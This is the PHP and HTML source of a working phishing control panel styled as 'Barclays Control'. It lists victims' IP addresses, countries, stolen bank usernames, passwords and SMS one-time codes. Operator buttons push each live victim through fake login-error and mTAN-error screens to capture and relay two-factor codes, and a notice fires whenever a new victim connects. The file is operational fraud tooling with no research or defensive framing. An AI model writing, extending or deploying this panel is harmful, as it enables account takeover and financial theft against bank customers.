<?php
session_start();
if (!isset($_SESSION['panel_loggedin']) || $_SESSION['panel_loggedin'] !== true) { 
    header('Location: login.php'); 
    exit; 
}

$data_dir = '../victims_data/'; 
$victims = [];
$online_count = 0;

if (is_dir($data_dir)) {
    $files = array_diff(scandir($data_dir), ['.', '..']);
    foreach ($files as $file) {
        if (pathinfo($file, PATHINFO_EXTENSION) == 'json') {
            $content = file_get_contents($data_dir . $file);
            $victim_data = json_decode($content, true);
            if (!empty($victim_data['id']) && ($victim_data['status'] ?? '') !== 'Blocked') {
                $victims[] = $victim_data;
                if ((time() - ($victim_data['last_seen'] ?? 0)) < 15) {
                    $online_count++;
                }
            }
        }
    }
}

usort($victims, fn($a, $b) => strtotime($b['timestamp'] ?? 0) - strtotime($a['timestamp'] ?? 0));
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Barclays Control Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }

        body {
            background: #f8fafc;
            color: #2d3748;
        }

        .container {
            display: flex;
            min-height: 100vh;
        }

        /* Sidebar */
        .sidebar {
            width: 260px;
            background: #1a202c;
            color: white;
            padding: 0;
        }

        .logo {
            padding: 30px 25px;
            border-bottom: 1px solid #2d3748;
            text-align: center;
        }

        .logo h2 {
            font-size: 20px;
            font-weight: 600;
        }

        .nav-menu {
            padding: 20px 0;
        }

        .nav-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 15px 25px;
            color: #cbd5e0;
            text-decoration: none;
            transition: all 0.3s;
            border-left: 3px solid transparent;
        }

        .nav-item.active {
            background: #2d3748;
            color: white;
            border-left-color: #037cc2;
        }

        .nav-item:hover {
            background: #2d3748;
            color: white;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            padding: 30px;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .header-left h1 {
            font-size: 28px;
            font-weight: 700;
            color: #1a202c;
        }

        .header-left p {
            color: #718096;
            margin-top: 5px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .auto-refresh {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            background: #10b981;
            color: white;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
        }

        .refresh-dot {
            width: 8px;
            height: 8px;
            background: white;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .last-update {
            font-size: 14px;
            color: #718096;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            border-left: 4px solid #037cc2;
            transition: transform 0.3s;
        }

        .stat-card:hover {
            transform: translateY(-2px);
        }

        .stat-card.online {
            border-left-color: #10b981;
        }

        .stat-card.total {
            border-left-color: #8b5cf6;
        }

        .stat-number {
            font-size: 32px;
            font-weight: 700;
            color: #1a202c;
        }

        .stat-label {
            color: #718096;
            font-size: 14px;
            margin-top: 5px;
        }

        /* Dashboard Grid */
        .dashboard-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }

        .card {
            background: white;
            border-radius: 12px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            overflow: hidden;
            transition: transform 0.3s;
        }

        .card:hover {
            transform: translateY(-2px);
        }

        .card-header {
            padding: 20px;
            border-bottom: 1px solid #e2e8f0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .card-header h3 {
            font-size: 16px;
            font-weight: 600;
            color: #1a202c;
        }

        .badge {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }

        .badge.online {
            background: #dcfce7;
            color: #166534;
        }

        .card-body {
            padding: 20px;
        }

        /* Connections */
        .connection-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid #f7fafc;
        }

        .connection-info {
            display: flex;
            flex-direction: column;
        }

        .connection-ip {
            font-weight: 600;
            color: #1a202c;
        }

        .connection-location {
            font-size: 12px;
            color: #718096;
        }

        .connection-status {
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 700;
            background: #dcfce7;
            color: #166534;
        }

        .no-data {
            text-align: center;
            padding: 40px 20px;
            color: #718096;
        }

        .no-data i {
            font-size: 48px;
            margin-bottom: 15px;
            opacity: 0.5;
        }

        /* Activity */
        .activity-item {
            display: flex;
            align-items: center;
            gap: 15px;
            padding: 12px 0;
            border-bottom: 1px solid #f7fafc;
        }

        .activity-icon {
            width: 32px;
            height: 32px;
            border-radius: 8px;
            background: #e0e7ff;
            color: #4f46e5;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .activity-details {
            flex: 1;
        }

        .activity-title {
            font-weight: 600;
            color: #1a202c;
            font-size: 14px;
        }

        .activity-meta {
            font-size: 12px;
            color: #718096;
        }

        /* Victims Table */
        .victims-table {
            background: white;
            border-radius: 12px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            overflow: hidden;
        }

        .table-header {
            display: grid;
            grid-template-columns: 2fr 2fr 1fr 2fr;
            gap: 20px;
            padding: 20px;
            background: #f7fafc;
            border-bottom: 1px solid #e2e8f0;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            color: #718096;
        }

        .table-row {
            display: grid;
            grid-template-columns: 2fr 2fr 1fr 2fr;
            gap: 20px;
            padding: 20px;
            border-bottom: 1px solid #f7fafc;
            transition: background 0.3s;
        }

        .table-row:hover {
            background: #f7fafc;
        }

        .table-row.online {
            background: #f0fdf4;
        }

        /* Victim Info */
        .victim-id {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            color: #1a202c;
            font-family: 'Courier New', monospace;
            margin-bottom: 5px;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
        }

        .status-dot.online { background: #10b981; }
        .status-dot.offline { background: #718096; }

        .victim-time {
            font-size: 12px;
            color: #718096;
            font-family: 'Courier New', monospace;
        }

        .victim-details {
            display: flex;
            flex-direction: column;
            gap: 4px;
            margin-top: 8px;
        }

        .detail {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 12px;
            color: #718096;
        }

        /* Credentials */
        .credential {
            margin-bottom: 10px;
        }

        .credential label {
            font-size: 11px;
            text-transform: uppercase;
            color: #718096;
            font-weight: 600;
            display: block;
            margin-bottom: 4px;
        }

        .cred-value {
            font-weight: 600;
            color: #1a202c;
            font-family: 'Courier New', monospace;
        }

        /* Status */
        .status-badge {
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            display: inline-block;
        }

        .status-badge.waiting { background: #fef3c7; color: #92400e; }
        .status-badge.completed { background: #dcfce7; color: #166534; }

        .online-badge {
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 10px;
            font-weight: 700;
            background: #dcfce7;
            color: #166534;
            margin-top: 5px;
            display: inline-block;
        }

        /* Controls */
        .control-group {
            margin-bottom: 15px;
        }

        .control-group label {
            font-size: 11px;
            text-transform: uppercase;
            color: #718096;
            font-weight: 600;
            display: block;
            margin-bottom: 8px;
        }

        .control-buttons {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 8px 12px;
            border-radius: 6px;
            text-decoration: none;
            font-size: 12px;
            font-weight: 600;
            transition: all 0.3s;
            border: none;
            cursor: pointer;
        }

        .btn-primary { background: #037cc2; color: white; }
        .btn-success { background: #10b981; color: white; }
        .btn-warning { background: #f59e0b; color: white; }
        .btn-error { background: #ef4444; color: white; }
        .btn-euro { background: #d97706; color: white; }
        .btn-danger { background: #dc2626; color: white; }
        .btn-dark { background: #374151; color: white; }

        .btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }

        /* No Victims */
        .no-victims {
            text-align: center;
            padding: 60px 20px;
            color: #718096;
            grid-column: 1 / -1;
        }

        .no-victims i {
            font-size: 48px;
            margin-bottom: 15px;
            opacity: 0.5;
        }

        /* Notification */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #10b981;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            z-index: 1000;
            display: flex;
            align-items: center;
            gap: 10px;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        /* Responsive */
        @media (max-width: 1024px) {
            .dashboard-grid {
                grid-template-columns: 1fr;
            }
            
            .table-header,
            .table-row {
                grid-template-columns: 1fr;
                gap: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="logo">
                <h2>Barclays Control</h2>
            </div>
            <nav class="nav-menu">
                <a href="#" class="nav-item active">
                    <i class="fas fa-user-secret"></i>
                    <span>Victim Control</span>
                </a>
                <a href="#" class="nav-item">
                    <i class="fas fa-cog"></i>
                    <span>Settings</span>
                </a>
                <a href="#" class="nav-item">
                    <i class="fas fa-chart-bar"></i>
                    <span>Analytics</span>
                </a>
            </nav>
        </div>

        <!-- Main Content -->
        <div class="main-content">
            <!-- Header -->
            <div class="header">
                <div class="header-left">
                    <h1>Victim Control Center</h1>
                    <p>Real-time monitoring and control</p>
                </div>
                <div class="header-right">
                    <div class="auto-refresh">
                        <span class="refresh-dot"></span>
                        <span>AUTO REFRESH</span>
                    </div>
                    <div class="last-update" id="lastUpdate">
                        Updated: <?php echo date('H:i:s'); ?>
                    </div>
                </div>
            </div>

            <!-- Stats -->
            <div class="stats-grid">
                <div class="stat-card online">
                    <div class="stat-number" id="onlineCount"><?php echo $online_count; ?></div>
                    <div class="stat-label">Online Now</div>
                </div>
                <div class="stat-card total">
                    <div class="stat-number" id="totalVictims"><?php echo count($victims); ?></div>
                    <div class="stat-label">Total Victims</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number"><?php echo count($victims); ?></div>
                    <div class="stat-label">Showing Victims</div>
                </div>
            </div>

            <!-- Dashboard Grid -->
            <div class="dashboard-grid">
                <!-- Active Connections -->
                <div class="card">
                    <div class="card-header">
                        <h3>Active Connections</h3>
                        <span class="badge online" id="onlineBadge"><?php echo $online_count; ?> Online</span>
                    </div>
                    <div class="card-body" id="connectionsList">
                        <?php if ($online_count > 0): ?>
                            <?php foreach ($victims as $v): ?>
                                <?php if ((time() - ($v['last_seen'] ?? 0)) < 15): ?>
                                    <div class="connection-item">
                                        <div class="connection-info">
                                            <div class="connection-ip"><?php echo htmlspecialchars($v['ip_address'] ?? 'N/A'); ?></div>
                                            <div class="connection-location"><?php echo htmlspecialchars($v['country'] ?? 'Unknown'); ?></div>
                                        </div>
                                        <div class="connection-status">LIVE</div>
                                    </div>
                                <?php endif; ?>
                            <?php endforeach; ?>
                        <?php else: ?>
                            <div class="no-data">
                                <i class="fas fa-wifi-slash"></i>
                                <p>No active connections</p>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>

                <!-- Recent Activity -->
                <div class="card">
                    <div class="card-header">
                        <h3>Recent Activity</h3>
                    </div>
                    <div class="card-body" id="activityList">
                        <?php if (!empty($victims)): ?>
                            <?php $recent_victims = array_slice($victims, 0, 3); ?>
                            <?php foreach ($recent_victims as $v): ?>
                                <div class="activity-item">
                                    <div class="activity-icon">
                                        <i class="fas fa-user-circle"></i>
                                    </div>
                                    <div class="activity-details">
                                        <div class="activity-title">New connection</div>
                                        <div class="activity-meta">
                                            <?php echo htmlspecialchars($v['ip_address'] ?? 'N/A'); ?> • 
                                            <?php echo date('H:i', strtotime($v['timestamp'] ?? 'now')); ?>
                                        </div>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        <?php else: ?>
                            <div class="no-data">
                                <i class="fas fa-clock"></i>
                                <p>No recent activity</p>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>

            <!-- Victim Management -->
            <div class="victims-table">
                <div class="table-header">
                    <div>VICTIM INFO</div>
                    <div>CREDENTIALS</div>
                    <div>STATUS</div>
                    <div>CONTROL PANEL</div>
                </div>

                <div class="table-body" id="victimsTable">
                    <?php if (empty($victims)): ?>
                        <div class="no-victims">
                            <i class="fas fa-user-slash"></i>
                            <h4>No Victims Connected</h4>
                            <p>Waiting for incoming connections...</p>
                        </div>
                    <?php else: ?>
                        <?php foreach ($victims as $v): ?>
                            <?php
                            $is_online = (time() - ($v['last_seen'] ?? 0)) < 15;
                            $status_text = htmlspecialchars($v['status'] ?? 'Initializing...');
                            $status_class = strpos($status_text, 'Waiting') !== false ? 'waiting' : 
                                         (strpos($status_text, 'Completed') !== false ? 'completed' : 'initial');
                            ?>
                            <div class="table-row <?php echo $is_online ? 'online' : ''; ?>" data-victim-id="<?php echo $v['id']; ?>">
                                <!-- Victim Info -->
                                <div class="table-cell">
                                    <div class="victim-id">
                                        <span class="status-dot <?php echo $is_online ? 'online' : 'offline'; ?>"></span>
                                        <?php echo htmlspecialchars(substr($v['id'], 0, 14)); ?>...
                                    </div>
                                    <div class="victim-time"><?php echo date('H:i:s', $v['last_seen'] ?? time()); ?></div>
                                    <div class="victim-details">
                                        <div class="detail">
                                            <i class="fas fa-globe"></i>
                                            <?php echo htmlspecialchars($v['ip_address'] ?? 'N/A'); ?>
                                        </div>
                                        <div class="detail">
                                            <i class="fas fa-map-marker-alt"></i>
                                            <?php echo htmlspecialchars($v['country'] ?? 'Unknown'); ?>
                                        </div>
                                    </div>
                                </div>

                                <!-- Credentials -->
                                <div class="table-cell">
                                    <?php if(!empty($v['login']['username'])): ?>
                                        <div class="credential">
                                            <label>Username</label>
                                            <span class="cred-value"><?php echo htmlspecialchars($v['login']['username']); ?></span>
                                        </div>
                                    <?php endif; ?>
                                    <?php if(!empty($v['login']['password'])): ?>
                                        <div class="credential">
                                            <label>Password</label>
                                            <span class="cred-value"><?php echo htmlspecialchars($v['login']['password']); ?></span>
                                        </div>
                                    <?php endif; ?>
                                    <?php if(!empty($v['mtan']['mtan'])): ?>
                                        <div class="credential">
                                            <label>SMS Code</label>
                                            <span class="cred-value"><?php echo htmlspecialchars($v['mtan']['mtan']); ?></span>
                                        </div>
                                    <?php endif; ?>
                                </div>

                                <!-- Status -->
                                <div class="table-cell">
                                    <div class="status-badge <?php echo $status_class; ?>">
                                        <?php echo $status_text; ?>
                                    </div>
                                    <?php if ($is_online): ?>
                                        <div class="online-badge">ONLINE</div>
                                    <?php endif; ?>
                                </div>

                                <!-- Control Panel -->
                                <div class="table-cell">
                                    <!-- Login Step Controls -->
                                    <?php if ($v['status'] === 'Waiting for mTAN'): ?>
                                        <div class="control-group">
                                            <label>Login Step:</label>
                                            <div class="control-buttons">
                                                <a href="action.php?id=<?php echo $v['id']; ?>&decision=show_full_login_error" class="btn btn-error">
                                                    <i class="fas fa-exclamation-triangle"></i> Login Error
                                                </a>
                                                <a href="action.php?id=<?php echo $v['id']; ?>&decision=go_to_mtan" class="btn btn-success">
                                                    <i class="fas fa-mobile-alt"></i> To mTAN
                                                </a>
                                            </div>
                                        </div>
                                    <?php endif; ?>

                                    <!-- mTAN Step Controls -->
                                    <?php if ($v['status'] === 'Waiting for mTAN' || !empty($v['mtan'])): ?>
                                        <div class="control-group">
                                            <label>mTAN Step:</label>
                                            <div class="control-buttons">
                                                <a href="action.php?id=<?php echo $v['id']; ?>&decision=show_mtan_error" class="btn btn-warning">
                                                    <i class="fas fa-exclamation-circle"></i> mTAN Error
                                                </a>
                                                <a href="action.php?id=<?php echo $v['id']; ?>&decision=show_euro_otp_error" class="btn btn-euro">
                                                    <i class="fas fa-euro-sign"></i> Euro OTP Error
                                                </a>
                                                <a href="action.php?id=<?php echo $v['id']; ?>&decision=finish" class="btn btn-primary">
                                                    <i class="fas fa-flag-checkered"></i> Finish
                                                </a>
                                            </div>
                                        </div>
                                    <?php endif; ?>

                                    <!-- Management Controls -->
                                    <div class="control-group">
                                        <label>Management:</label>
                                        <div class="control-buttons">
                                            <a href="action.php?id=<?php echo $v['id']; ?>&decision=block" class="btn btn-danger">
                                                <i class="fas fa-ban"></i> Block
                                            </a>
                                            <a href="action.php?id=<?php echo $v['id']; ?>&decision=delete" class="btn btn-dark" onclick="return confirm('Delete this victim permanently?');">
                                                <i class="fas fa-trash"></i> Delete
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>

    <script>
        let refreshInterval = 5000; // 5 seconds
        let lastVictimCount = <?php echo count($victims); ?>;
        let lastOnlineCount = <?php echo $online_count; ?>;

        // Auto-refresh function
        function autoRefresh() {
            fetch(window.location.href)
                .then(response => response.text())
                .then(html => {
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(html, 'text/html');
                    
                    // Update stats
                    const newOnlineCount = doc.querySelector('#onlineCount')?.textContent || '0';
                    const newTotalVictims = doc.querySelector('#totalVictims')?.textContent || '0';
                    
                    document.getElementById('onlineCount').textContent = newOnlineCount;
                    document.getElementById('totalVictims').textContent = newTotalVictims;
                    document.getElementById('onlineBadge').textContent = newOnlineCount + ' Online';
                    
                    // Update connections list
                    const newConnectionsList = doc.querySelector('#connectionsList')?.innerHTML;
                    if (newConnectionsList) {
                        document.getElementById('connectionsList').innerHTML = newConnectionsList;
                    }
                    
                    // Update activity list
                    const newActivityList = doc.querySelector('#activityList')?.innerHTML;
                    if (newActivityList) {
                        document.getElementById('activityList').innerHTML = newActivityList;
                    }
                    
                    // Update victims table
                    const newVictimsTable = doc.querySelector('#victimsTable')?.innerHTML;
                    if (newVictimsTable) {
                        document.getElementById('victimsTable').innerHTML = newVictimsTable;
                    }
                    
                    // Update timestamp
                    document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString();
                    
                    // Show notification if new victims connected
                    const currentVictimCount = parseInt(newTotalVictims);
                    const currentOnlineCount = parseInt(newOnlineCount);
                    
                    if (currentVictimCount > lastVictimCount) {
                        showNotification('New victim connected!', 'success');
                    }
                    
                    if (currentOnlineCount > lastOnlineCount) {
                        showNotification('New online connection!', 'success');
                    }
                    
                    lastVictimCount = currentVictimCount;
                    lastOnlineCount = currentOnlineCount;
                })
                .catch(error => {
                    console.log('Auto-refresh failed:', error);
                });
        }

        // Show notification
        function showNotification(message, type = 'info') {
            // Remove existing notification
            const existingNotification = document.querySelector('.notification');
            if (existingNotification) {
                existingNotification.remove();
            }
            
            const notification = document.createElement('div');
            notification.className = `notification ${type}`;
            notification.innerHTML = `
                <i class="fas fa-${type === 'success' ? 'check' : 'info'}-circle"></i>
                <span>${message}</span>
            `;
            
            document.body.appendChild(notification);
            
            // Auto remove after 3 seconds
            setTimeout(() => {
                if (notification.parentElement) {
                    notification.remove();
                }
            }, 3000);
        }

        // Start auto-refresh
        setInterval(autoRefresh, refreshInterval);

        // Initial refresh after page load
        setTimeout(autoRefresh, 1000);

        // Add hover effects to cards
        document.addEventListener('DOMContentLoaded', function() {
            const cards = document.querySelectorAll('.stat-card, .card');
            cards.forEach(card => {
                card.addEventListener('mouseenter', function() {
                    this.style.transform = 'translateY(-2px)';
                });
                card.addEventListener('mouseleave', function() {
                    this.style.transform = 'translateY(0)';
                });
            });
        });
    </script>
</body>
</html>